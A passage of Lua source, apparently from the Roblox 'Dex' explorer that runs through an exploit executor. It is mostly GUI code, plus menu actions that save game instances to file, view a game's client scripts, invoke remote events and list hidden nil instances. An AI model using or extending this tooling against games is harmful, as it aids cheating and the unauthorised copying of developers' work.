				end
			else
				ypcall(function()
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				end)
				if CurrentSaveInstanceWindow then
					CurrentSaveInstanceWindow:Destroy()
					CurrentSaveInstanceWindow = nil
					if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
						explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
					end
				end
			end
		else
			ypcall(function()
				if SaveInstance then
					SaveInstance(inst,filename.Text..".rbxmx",not saveObjects)
				else
					_G.SaveInstance(inst,filename.Text,not saveObjects)
				end
			end)
			if CurrentSaveInstanceWindow then
				CurrentSaveInstanceWindow:Destroy()
				CurrentSaveInstanceWindow = nil
				if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
					explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
				end
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.Cancel.MouseButton1Up:connect(function()
		if CurrentSaveInstanceWindow then
			CurrentSaveInstanceWindow:Destroy()
			CurrentSaveInstanceWindow = nil
			if explorerPanel.Parent:FindFirstChild("SaveInstanceOverwriteCaution") then
				explorerPanel.Parent.SaveInstanceOverwriteCaution:Destroy()
			end
		end
	end)
	CurrentSaveInstanceWindow.MainWindow.SaveObjects.MouseButton1Up:connect(function()
		if saveObjects then
			saveObjects = false
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = false
		else
			saveObjects = true
			CurrentSaveInstanceWindow.MainWindow.SaveObjects.enabled.Visible = true
		end
	end)
end

function DestroyRightClick()
	if currentRightClickMenu then
		currentRightClickMenu:Destroy()
		currentRightClickMenu = nil
	end
	if CurrentInsertObjectWindow and CurrentInsertObjectWindow.Visible then
		CurrentInsertObjectWindow.Visible = false
	end
end

function rightClickMenu(sObj)
	local mouse = game.Players.LocalPlayer:GetMouse()
	
	currentRightClickMenu = CreateRightClickMenu(
		{"Cut","Copy","Paste Into","Duplicate","Delete","Group","Ungroup","Select Children","Teleport To","Insert Part","Insert Object","View Script","Save Instance","Call Function","Call Remote"},
		"",
		false,
		function(option)
			if option == "Cut" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				local cut = {}
				for i = 1,#list do
					local obj = list[i]:Clone()
					if obj then
						table.insert(clipboard,obj)
						table.insert(cut,list[i])
					end
				end
				for i = 1,#cut do
					pcall(delete,cut[i])
				end
				updateActions()
			elseif option == "Copy" then
				if not Option.Modifiable then return end
				clipboard = {}
				local list = Selection.List
				for i = 1,#list do
					table.insert(clipboard,list[i]:Clone())
				end
				updateActions()
			elseif option == "Paste Into" then
				if not Option.Modifiable then return end
				local parent = Selection.List[1] or workspace
				for i = 1,#clipboard do
					clipboard[i]:Clone().Parent = parent
				end
			elseif option == "Duplicate" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					list[i]:Clone().Parent = Selection.List[1].Parent or workspace
				end
			elseif option == "Delete" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					pcall(delete,list[i])
				end
				Selection:Set({})
			elseif option == "Group" then
				if not Option.Modifiable then return end
				local newModel = Instance.new("Model")
				local list = Selection:Get()
				newModel.Parent = Selection.List[1].Parent or workspace
				for i = 1,#list do
					list[i].Parent = newModel
				end
				Selection:Set({})
			elseif option == "Ungroup" then
				if not Option.Modifiable then return end
				local ungrouped = {}
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("Model") then
						for i2,v2 in pairs(list[i]:GetChildren()) do
							v2.Parent = list[i].Parent or workspace
							table.insert(ungrouped,v2)
						end		
						pcall(delete,list[i])			
					end
				end
				Selection:Set({})
				if SettingsRemote:Invoke("SelectUngrouped") then
					for i,v in pairs(ungrouped) do
						Selection:Add(v)
					end
				end
			elseif option == "Select Children" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				Selection:Set({})
				Selection:StopUpdates()
				for i = 1,#list do
					for i2,v2 in pairs(list[i]:GetChildren()) do
						Selection:Add(v2)
					end
				end
				Selection:ResumeUpdates()
			elseif option == "Teleport To" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("BasePart") then
						pcall(function()
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = list[i].CFrame
						end)
						break
					end
				end
			elseif option == "Insert Part" then
				if not Option.Modifiable then return end
				local insertedParts = {}
				local list = Selection:Get()
				for i = 1,#list do
					pcall(function()
						local newPart = Instance.new("Part")
						newPart.Parent = list[i]
						newPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position) + Vector3.new(0,3,0)
						table.insert(insertedParts,newPart)
					end)
				end
			elseif option == "Save Instance" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				if #list == 1 then
					list[1].Archivable = true
					ypcall(function()PromptSaveInstance(list[1]:Clone())end)
				elseif #list > 1 then
					local newModel = Instance.new("Model")
					newModel.Name = "SavedInstances"
					for i = 1,#list do
						ypcall(function()
							list[i].Archivable = true
							list[i]:Clone().Parent = newModel
						end)
					end
					PromptSaveInstance(newModel)
				end
			elseif option == "Call Remote" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("RemoteFunction") or list[i]:IsA("RemoteEvent") then
						PromptRemoteCaller(list[i])
						break
					end
				end
			elseif option == "View Script" then
				if not Option.Modifiable then return end
				local list = Selection:Get()
				for i = 1,#list do
					if list[i]:IsA("LocalScript") or list[i]:IsA("ModuleScript") then
						ScriptEditorEvent:Fire(list[i])
					end
				end
			end
	end)
	currentRightClickMenu.Parent = explorerPanel.Parent
	currentRightClickMenu.Position = UDim2.new(0,mouse.X,0,mouse.Y)
	if currentRightClickMenu.AbsolutePosition.X + currentRightClickMenu.AbsoluteSize.X > explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X then
		currentRightClickMenu.Position = UDim2.new(0, explorerPanel.AbsolutePosition.X + explorerPanel.AbsoluteSize.X - currentRightClickMenu.AbsoluteSize.X, 0, mouse.Y)
	end
end

local function cancelReparentDrag()end
local function cancelSelectDrag()end
do
	local listEntries = {}
	local nameConnLookup = {}

	local mouseDrag = Create('ImageButton',{
		Name = "MouseDrag";
		Position = UDim2.new(-0.25,0,-0.25,0);
		Size = UDim2.new(1.5,0,1.5,0);
		Transparency = 1;
		AutoButtonColor = false;
		Active = true;
		ZIndex = 10;
	})
	local function dragSelect(last,add,button)
		local connDrag
		local conUp

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local pos = Vector2.new(x,y) - listFrame.AbsolutePosition
			local size = listFrame.AbsoluteSize
			if pos.x < 0 or pos.x > size.x or pos.y < 0 or pos.y > size.y then return end

			local i = math.ceil(pos.y/ENTRY_BOUND) + scrollBar.ScrollIndex
			-- Mouse may have made a large step, so interpolate between the
			-- last index and the current.
			for n = i<last and i or last, i>last and i or last do
				local node = TreeList[n]
				if node then
					if add then
						Selection:Add(node.Object)
					else
						Selection:Remove(node.Object)
					end
				end
			end
			last = i
		end)

		function cancelSelectDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			function cancelSelectDrag()end
		end

		conUp = mouseDrag[button]:connect(cancelSelectDrag)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local function dragReparent(object,dragGhost,clickPos,ghostOffset)
		local connDrag
		local conUp
		local conUp2

		local parentIndex = nil
		local dragged = false

		local parentHighlight = Create('Frame',{
			Transparency = 1;
			Visible = false;
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(1,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,1,0);
				Size = UDim2.new(1,0,0,1);
			});
			Create('Frame',{
				BorderSizePixel = 0;
				BackgroundColor3 = Color3.new(0,0,0);
				BackgroundTransparency = 0.1;
				Position = UDim2.new(0,0,0,0);
				Size = UDim2.new(0,1,1,0);
			});
		})
		SetZIndex(parentHighlight,9)

		conDrag = mouseDrag.MouseMoved:connect(function(x,y)
			local dragPos = Vector2.new(x,y)
			if dragged then
				local pos = dragPos - listFrame.AbsolutePosition
				local size = listFrame.AbsoluteSize

				parentIndex = nil
				parentHighlight.Visible = false
				if pos.x >= 0 and pos.x <= size.x and pos.y >= 0 and pos.y <= size.y + ENTRY_SIZE*2 then
					local i = math.ceil(pos.y/ENTRY_BOUND-2)
					local node = TreeList[i + scrollBar.ScrollIndex]
					if node and node.Object ~= object and not object:IsAncestorOf(node.Object) then
						parentIndex = i
						local entry = listEntries[i]
						if entry then
							parentHighlight.Visible = true
							parentHighlight.Position = UDim2.new(0,1,0,entry.AbsolutePosition.y-listFrame.AbsolutePosition.y)
							parentHighlight.Size = UDim2.new(0,size.x-4,0,entry.AbsoluteSize.y)
						end
					end
				end

				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
			elseif (clickPos-dragPos).magnitude > 8 then
				dragged = true
				SetZIndex(dragGhost,9)
				dragGhost.IndentFrame.Transparency = 0.25
				dragGhost.IndentFrame.EntryText.TextColor3 = GuiColor.TextSelected
				dragGhost.Position = UDim2.new(0,dragPos.x+ghostOffset.x,0,dragPos.y+ghostOffset.y)
				dragGhost.Parent = GetScreen(listFrame)
				parentHighlight.Parent = listFrame
			end
		end)

		function cancelReparentDrag()
			mouseDrag.Parent = nil
			conDrag:disconnect()
			conUp:disconnect()
			conUp2:disconnect()
			dragGhost:Destroy()
			parentHighlight:Destroy()
			function cancelReparentDrag()end
		end

		local wasSelected = Selection.Selected[object]
		if not wasSelected and Option.Selectable then
			Selection:Set({object})
		end

		conUp = mouseDrag.MouseButton1Up:connect(function()
			cancelReparentDrag()
			if dragged then
				if parentIndex then
					local parentNode = TreeList[parentIndex + scrollBar.ScrollIndex]
					if parentNode then
						parentNode.Expanded = true

						local parentObj = parentNode.Object
						local function parent(a,b)
							a.Parent = b
						end
						if Option.Selectable then
							local list = Selection.List
							for i = 1,#list do
								pcall(parent,list[i],parentObj)
							end
						else
							pcall(parent,object,parentObj)
						end
					end
				end
			else
				-- do selection click
				if wasSelected and Option.Selectable then
					Selection:Set({})
				end
			end
		end)
		conUp2 = mouseDrag.MouseButton2Down:connect(function()
			cancelReparentDrag()
		end)

		mouseDrag.Parent = GetScreen(listFrame)
	end

	local entryTemplate = Create('ImageButton',{
		Name = "Entry";
		Transparency = 1;
		AutoButtonColor = false;
		Position = UDim2.new(0,0,0,0);
		Size = UDim2.new(1,0,0,ENTRY_SIZE);
		Create('Frame',{
			Name = "IndentFrame";
			BackgroundTransparency = 1;
			BackgroundColor3 = GuiColor.Selected;
			BorderColor3 = GuiColor.BorderSelected;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,0,1,0);
			Create(Icon('ImageButton',0),{
				Name = "Expand";
				AutoButtonColor = false;
				Position = UDim2.new(0,-GUI_SIZE,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create(Icon(nil,0),{
				Name = "ExplorerIcon";
				Position = UDim2.new(0,2+ENTRY_PADDING,0.5,-GUI_SIZE/2);
				Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			});
			Create('TextLabel',{
				Name = "EntryText";
				BackgroundTransparency = 1;
				TextColor3 = GuiColor.Text;
				TextXAlignment = 'Left';
				TextYAlignment = 'Center';
				Font = FONT;
				FontSize = FONT_SIZE;
				Text = "";
				Position = UDim2.new(0,2+ENTRY_SIZE+4,0,0);
				Size = UDim2.new(1,-2,1,0);
			});
		});
	})

	function scrollBar.UpdateCallback(self)
		for i = 1,self.VisibleSpace do
			local node = TreeList[i + self.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if not entry then
					entry = Create(entryTemplate:Clone(),{
						Position = UDim2.new(0,2,0,ENTRY_BOUND*(i-1)+2);
						Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE);
						ZIndex = listFrame.ZIndex;
					})
					listEntries[i] = entry

					local expand = entry.IndentFrame.Expand
					expand.MouseEnter:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED_OVER)
							else
								Icon(expand,NODE_COLLAPSED_OVER)
							end
						end
					end)
					expand.MouseLeave:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							if node.Expanded then
								Icon(expand,NODE_EXPANDED)
							else
								Icon(expand,NODE_COLLAPSED)
							end
						end
					end)
					expand.MouseButton1Down:connect(function()
						local node = TreeList[i + self.ScrollIndex]
						if #node > 0 then
							node.Expanded = not node.Expanded
							if node.Object == explorerPanel.Parent and node.Expanded then
								CreateCaution("Warning","Please be careful when editing instances inside here, this is like the System32 of Dex and modifying objects here can break Dex.")
							end
							-- use raw update so the list updates instantly
							rawUpdateList()
						end
					end)

					entry.MouseButton1Down:connect(function(x,y)
						local node = TreeList[i + self.ScrollIndex]
						DestroyRightClick()
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not HoldingShift then
							lastSelectedNode = i + self.ScrollIndex
						end
						
						if HoldingShift and not filteringWorkspace() then
							if lastSelectedNode then
								if i + self.ScrollIndex - lastSelectedNode > 0 then
									Selection:StopUpdates()
									for i2 = 1, i + self.ScrollIndex - lastSelectedNode do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								else
									Selection:StopUpdates()
									for i2 = i + self.ScrollIndex - lastSelectedNode, 1 do
										local newNode = TreeList[lastSelectedNode + i2]
										if newNode then
											Selection:Add(newNode.Object)
										end
									end
									Selection:ResumeUpdates()
								end
							end
							return
						end
						
						if HoldingCtrl then
							if Selection.Selected[node.Object] then
								Selection:Remove(node.Object)
							else
								Selection:Add(node.Object)
							end
							return
						end
						if Option.Modifiable then
							local pos = Vector2.new(x,y)
							dragReparent(node.Object,entry:Clone(),pos,entry.AbsolutePosition-pos)
						elseif Option.Selectable then
							if Selection.Selected[node.Object] then
								Selection:Set({})
							else
								Selection:Set({node.Object})
							end
							dragSelect(i+self.ScrollIndex,true,'MouseButton1Up')
						end
					end)

					entry.MouseButton2Down:connect(function()
						if not Option.Selectable then return end
						
						DestroyRightClick()
						
						curSelect = entry
						
						local node = TreeList[i + self.ScrollIndex]
						
						if GetAwaitRemote:Invoke() then
							bindSetAwaiting:Fire(node.Object)
							return
						end
						
						if not Selection.Selected[node.Object] then
							Selection:Set({node.Object})
						end
					end)
					
					
					entry.MouseButton2Up:connect(function()
						if not Option.Selectable then return end
						
						local node = TreeList[i + self.ScrollIndex]
						
						if checkMouseInGui(curSelect) then
							rightClickMenu(node.Object)
						end
					end)

					entry.Parent = listFrame
				end

				entry.Visible = true

				local object = node.Object

				-- update expand icon
				if #node == 0 then
					entry.IndentFrame.Expand.Visible = false
				elseif node.Expanded then
					Icon(entry.IndentFrame.Expand,NODE_EXPANDED)
					entry.IndentFrame.Expand.Visible = true
				else
					Icon(entry.IndentFrame.Expand,NODE_COLLAPSED)
					entry.IndentFrame.Expand.Visible = true
				end

				-- update explorer icon
				Icon(entry.IndentFrame.ExplorerIcon,ExplorerIndex[object.ClassName] or 0)

				-- update indentation
				local w = (node.Depth)*(2+ENTRY_PADDING+GUI_SIZE)
				entry.IndentFrame.Position = UDim2.new(0,w,0,0)
				entry.IndentFrame.Size = UDim2.new(1,-w,1,0)

				-- update name change detection
				if nameConnLookup[entry] then
					nameConnLookup[entry]:disconnect()
				end
				local text = entry.IndentFrame.EntryText
				text.Text = object.Name
				nameConnLookup[entry] = node.Object.Changed:connect(function(p)
					if p == 'Name' then
						text.Text = object.Name
					end
				end)

				-- update selection
				entry.IndentFrame.Transparency = node.Selected and 0 or 1
				text.TextColor3 = GuiColor[node.Selected and 'TextSelected' or 'Text']

				entry.Size = UDim2.new(0,nodeWidth,0,ENTRY_SIZE)
			elseif listEntries[i] then
				listEntries[i].Visible = false
			end
		end
		for i = self.VisibleSpace+1,self.TotalSpace do
			local entry = listEntries[i]
			if entry then
				listEntries[i] = nil
				entry:Destroy()
			end
		end
	end

	function scrollBarH.UpdateCallback(self)
		for i = 1,scrollBar.VisibleSpace do
			local node = TreeList[i + scrollBar.ScrollIndex]
			if node then
				local entry = listEntries[i]
				if entry then
					entry.Position = UDim2.new(0,2 - scrollBarH.ScrollIndex,0,ENTRY_BOUND*(i-1)+2)
				end
			end
		end
	end

	Connect(listFrame.Changed,function(p)
		if p == 'AbsoluteSize' then
			rawUpdateSize()
		end
	end)

	local wheelAmount = 6
	explorerPanel.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	explorerPanel.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Object detection

-- Inserts `v` into `t` at `i`. Also sets `Index` field in `v`.
local function insert(t,i,v)
	for n = #t,i,-1 do
		local v = t[n]
		v.Index = n+1
		t[n+1] = v
	end
	v.Index = i
	t[i] = v
end

-- Removes `i` from `t`. Also sets `Index` field in removed value.
local function remove(t,i)
	local v = t[i]
	for n = i+1,#t do
		local v = t[n]
		v.Index = n-1
		t[n-1] = v
	end
	t[#t] = nil
	v.Index = 0
	return v
end

-- Returns how deep `o` is in the tree.
local function depth(o)
	local d = -1
	while o do
		o = o.Parent
		d = d + 1
	end
	return d
end


local connLookup = {}

-- Returns whether a node would be present in the tree list
local function nodeIsVisible(node)
	local visible = true
	node = node.Parent
	while node and visible do
		visible = visible and node.Expanded
		node = node.Parent
	end
	return visible
end

-- Removes an object's tree node. Called when the object stops existing in the
-- game tree.
local function removeObject(object)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	Selection:Remove(object,true)

	local parent = objectNode.Parent
	remove(parent,objectNode.Index)
	NodeLookup[object] = nil
	connLookup[object]:disconnect()
	connLookup[object] = nil

	if visible then
		updateList()
	elseif nodeIsVisible(parent) then
		updateScroll()
	end
end

-- Moves a tree node to a new parent. Called when an existing object's parent
-- changes.
local function moveObject(object,parent)
	local objectNode = NodeLookup[object]
	if not objectNode then
		return
	end

	local parentNode = NodeLookup[parent]
	if not parentNode then
		return
	end

	local visible = nodeIsVisible(objectNode)

	remove(objectNode.Parent,objectNode.Index)
	objectNode.Parent = parentNode

	objectNode.Depth = depth(object)
	local function r(node,d)
		for i = 1,#node do
			node[i].Depth = d
			r(node[i],d+1)
		end
	end
	r(objectNode,objectNode.Depth+1)

	insert(parentNode,#parentNode+1,objectNode)

	if visible or nodeIsVisible(objectNode) then
		updateList()
	elseif nodeIsVisible(objectNode.Parent) then
		updateScroll()
	end
end

-- ScriptContext['/Libraries/LibraryRegistration/LibraryRegistration']
-- This RobloxLocked object lets me index its properties for some reason

local function check(object)
	return object.AncestryChanged
end

-- Creates a new tree node from an object. Called when an object starts
-- existing in the game tree.
local function addObject(object,noupdate)
	if script then
		-- protect against naughty RobloxLocked objects
		local s = pcall(check,object)
		if not s then
			return
		end
	end

	local parentNode = NodeLookup[object.Parent]
	if not parentNode then
		return
	end

	local objectNode = {
		Object = object;
		Parent = parentNode;
		Index = 0;
		Expanded = false;
		Selected = false;
		Depth = depth(object);
	}

	connLookup[object] = Connect(object.AncestryChanged,function(c,p)
		if c == object then
			if p == nil then
				removeObject(c)
			else
				moveObject(c,p)
			end
		end
	end)

	NodeLookup[object] = objectNode
	insert(parentNode,#parentNode+1,objectNode)

	if not noupdate then
		if nodeIsVisible(objectNode) then
			updateList()
		elseif nodeIsVisible(objectNode.Parent) then
			updateScroll()
		end
	end
end

local function makeObject(obj,par)
	local newObject = Instance.new(obj.ClassName)
	for i,v in pairs(obj.Properties) do
		ypcall(function()
			local newProp
			newProp = ToPropValue(v.Value,v.Type)
			newObject[v.Name] = newProp
		end)
	end
	newObject.Parent = par
end

local function writeObject(obj)
	local newObject = {ClassName = obj.ClassName, Properties = {}}
	for i,v in pairs(RbxApi.GetProperties(obj.className)) do
		if v["Name"] ~= "Parent" then
			print("thispassed")
			table.insert(newObject.Properties,{Name = v["Name"], Type = v["ValueType"], Value = tostring(obj[v["Name"]])})
		end
	end
	return newObject
end

local function buildDexStorage()
	local localDexStorage
	
	local success,err = ypcall(function()
		localDexStorage = game:GetObjects("rbxasset://DexStorage.rbxm")[1]
	end)
	
	if success and localDexStorage then
		for i,v in pairs(localDexStorage:GetChildren()) do
			ypcall(function()
				v.Parent = DexStorageMain
			end)
		end
	end
	
	updateDexStorageListeners()
	--[[
	local localDexStorage = readfile(getelysianpath().."DexStorage.txt")--game:GetService("CookiesService"):GetCookieValue("DexStorage")
	--local success,err = pcall(function()
		if localDexStorage then
			local objTable = game:GetService("HttpService"):JSONDecode(localDexStorage)
			for i,v in pairs(objTable) do
				makeObject(v,DexStorageMain)
			end
		end
	--end)
	--]]
end

local dexStorageDebounce = false
local dexStorageListeners = {}

local function updateDexStorage()
	if dexStorageDebounce then return end
	dexStorageDebounce = true	
	
	wait()
	
	pcall(function()
		saveinstance("content//DexStorage.rbxm",DexStorageMain)
	end)
	
	updateDexStorageListeners()
	
	dexStorageDebounce = false
	--[[
	local success,err = ypcall(function()
		local objs = {}
		for i,v in pairs(DexStorageMain:GetChildren()) do
			table.insert(objs,writeObject(v))
		end
		writefile(getelysianpath().."DexStorage.txt",game:GetService("HttpService"):JSONEncode(objs))
		--game:GetService("CookiesService"):SetCookieValue("DexStorage",game:GetService("HttpService"):JSONEncode(objs))
	end)
	if err then
		CreateCaution("DexStorage Save Fail!","DexStorage broke! If you see this message, report to Raspberry Pi!")
	end
	print("hi")
	--]]
end

function updateDexStorageListeners()
	for i,v in pairs(dexStorageListeners) do
		v:Disconnect()
	end
	dexStorageListeners = {}
	for i,v in pairs(DexStorageMain:GetChildren()) do
		pcall(function()
			local ev = v.Changed:connect(updateDexStorage)
			table.insert(dexStorageListeners,ev)
		end)
	end
end

do
	NodeLookup[workspace.Parent] = {
		Object = workspace.Parent;
		Parent = nil;
		Index = 0;
		Expanded = true;
	}
	
	if DexStorageEnabled then
		NodeLookup[DexStorage] = {
			Object = DexStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end
	
	if NilStorageEnabled then
		NodeLookup[NilStorage] = {
			Object = NilStorage;
			Parent = nil;
			Index = 0;
			Expanded = true;
		}
	end

	Connect(game.DescendantAdded,addObject)
	Connect(game.DescendantRemoving,removeObject)
	
	if DexStorageEnabled then
		--[[
		if readfile(getelysianpath().."DexStorage.txt") == nil then
			writefile(getelysianpath().."DexStorage.txt","")
		end
		--]]
		
		buildDexStorage()
	
		Connect(DexStorage.DescendantAdded,addObject)
		Connect(DexStorage.DescendantRemoving,removeObject)
	
		Connect(DexStorage.DescendantAdded,updateDexStorage)
		Connect(DexStorage.DescendantRemoving,updateDexStorage)
	end
	
	if NilStorageEnabled then
		Connect(NilStorage.DescendantAdded,addObject)
		Connect(NilStorage.DescendantRemoving,removeObject)		
		
		local currentTable = get_nil_instances()	
		
		spawn(function()
			while wait() do
				if #currentTable ~= #get_nil_instances() then
					currentTable = get_nil_instances()
					--NilStorageMain:ClearAllChildren()
					for i,v in pairs(get_nil_instances()) do
						if v ~= NilStorage and v ~= DexStorage then
							pcall(function()
								v.Parent = NilStorageMain
							end)
							--[[
							local newNil = v
							newNil.Archivable = true
							newNil:Clone().Parent = NilStorageMain
							--]]
						end
					end
				end
			end
		end)
	end

	local function get(o)
		return o:GetChildren()
	end

	local function r(o)
		local s,children = pcall(get,o)
		if s then
			for i = 1,#children do
				addObject(children[i],true)
				r(children[i])
			end
		end
	end

	r(workspace.Parent)
	if DexStorageEnabled then
		r(DexStorage)
	end
	if NilStorageEnabled then
		r(NilStorage)
	end

	scrollBar.VisibleSpace = math.ceil(listFrame.AbsoluteSize.y/ENTRY_BOUND)
	updateList()
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Actions

local actionButtons do
	actionButtons = {}

	local totalActions = 1
	local currentActions = totalActions
	local function makeButton(icon,over,name,vis,cond)
		local buttonEnabled = false
		
		local button = Create(Icon('ImageButton',icon),{
			Name = name .. "Button";
			Visible = Option.Modifiable and Option.Selectable;
			Position = UDim2.new(1,-(GUI_SIZE+2)*currentActions+2,0.25,-GUI_SIZE/2);
			Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE);
			Parent = headerFrame;
		})

		local tipText = Create('TextLabel',{
			Name = name .. "Text";
			Text = name;
			Visible = false;
			BackgroundTransparency = 1;
			TextXAlignment = 'Right';
			Font = FONT;
			FontSize = FONT_SIZE;
			Position = UDim2.new(0,0,0,0);
			Size = UDim2.new(1,-(GUI_SIZE+2)*totalActions,1,0);
			Parent = headerFrame;
		})

		
		button.MouseEnter:connect(function()
			if buttonEnabled then
				button.BackgroundTransparency = 0.9
			end
			--Icon(button,over)
			--tipText.Visible = true
		end)
		button.MouseLeave:connect(function()
			button.BackgroundTransparency = 1
			--Icon(button,icon)
			--tipText.Visible = false
		end)

		currentActions = currentActions + 1
		actionButtons[#actionButtons+1] = {Obj = button,Cond = cond}
		QuickButtons[#actionButtons+1] = {Obj = button,Cond = cond, Toggle = function(on)
			if on then
				buttonEnabled = true
				Icon(button,over)
			else
				buttonEnabled = false
				Icon(button,icon)
			end
		end}
		return button
	end

	--local clipboard = {}
	local function delete(o)
		o.Parent = nil
	end
	
	makeButton(ACTION_EDITQUICKACCESS,ACTION_EDITQUICKACCESS,"Options",true,function()return true end).MouseButton1Click:connect(function()
		
	end)
	

	-- DELETE
	makeButton(ACTION_DELETE,ACTION_DELETE_OVER,"Delete",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local list = Selection:Get()
		for i = 1,#list do
			pcall(delete,list[i])
		end
		Selection:Set({})
	end)
	
	-- PASTE
	makeButton(ACTION_PASTE,ACTION_PASTE_OVER,"Paste",true,function() return #Selection:Get() > 0 and #clipboard > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		local parent = Selection.List[1] or workspace
		for i = 1,#clipboard do
			clipboard[i]:Clone().Parent = parent
		end
	end)
	
	-- COPY
	makeButton(ACTION_COPY,ACTION_COPY_OVER,"Copy",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		for i = 1,#list do
			table.insert(clipboard,list[i]:Clone())
		end
		updateActions()
	end)
	
	-- CUT
	makeButton(ACTION_CUT,ACTION_CUT_OVER,"Cut",true,function() return #Selection:Get() > 0 end).MouseButton1Click:connect(function()
		if not Option.Modifiable then return end
		clipboard = {}
		local list = Selection.List
		local cut = {}
		for i = 1,#list do
			local obj = list[i]:Clone()
			if obj then
				table.insert(clipboard,obj)
				table.insert(cut,list[i])
			end
		end
		for i = 1,#cut do
			pcall(delete,cut[i])
		end
		updateActions()
	end)
	
	-- FREEZE
	makeButton(ACTION_FREEZE,ACTION_FREEZE,"Freeze",true,function() return true end)
	
	-- ADD/REMOVE STARRED
	makeButton(ACTION_ADDSTAR,ACTION_ADDSTAR_OVER,"Star",true,function() return #Selection:Get() > 0 end)
	
	-- STARRED
	makeButton(ACTION_STARRED,ACTION_STARRED,"Starred",true,function() return true end)


	-- SORT
	-- local actionSort = makeButton(ACTION_SORT,ACTION_SORT_OVER,"Sort")
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Option Bindables

do
	local optionCallback = {
		Modifiable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Selectable
			end
			cancelReparentDrag()
		end;
		Selectable = function(value)
			for i = 1,#actionButtons do
				actionButtons[i].Obj.Visible = value and Option.Modifiable
			end
			cancelSelectDrag()
			Selection:Set({})
		end;
	}

	local bindSetOption = explorerPanel:FindFirstChild("SetOption")
	if not bindSetOption then
		bindSetOption = Create('BindableFunction',{Name = "SetOption"})
		bindSetOption.Parent = explorerPanel
	end

	bindSetOption.OnInvoke = function(optionName,value)
		if optionCallback[optionName] then
			Option[optionName] = value
			optionCallback[optionName](value)
		end
	end

	local bindGetOption = explorerPanel:FindFirstChild("GetOption")
	if not bindGetOption then
		bindGetOption = Create('BindableFunction',{Name = "GetOption"})
		bindGetOption.Parent = explorerPanel
	end

	bindGetOption.OnInvoke = function(optionName)
		if optionName then
			return Option[optionName]
		else
			local options = {}
			for k,v in pairs(Option) do
				options[k] = v
			end
			return options
		end
	end
end

function SelectionVar()
	return Selection
end

Input.InputBegan:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = true
	end
	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = true
	end
end)

Input.InputEnded:connect(function(key)
	if key.KeyCode == Enum.KeyCode.LeftControl then
		HoldingCtrl = false
	end
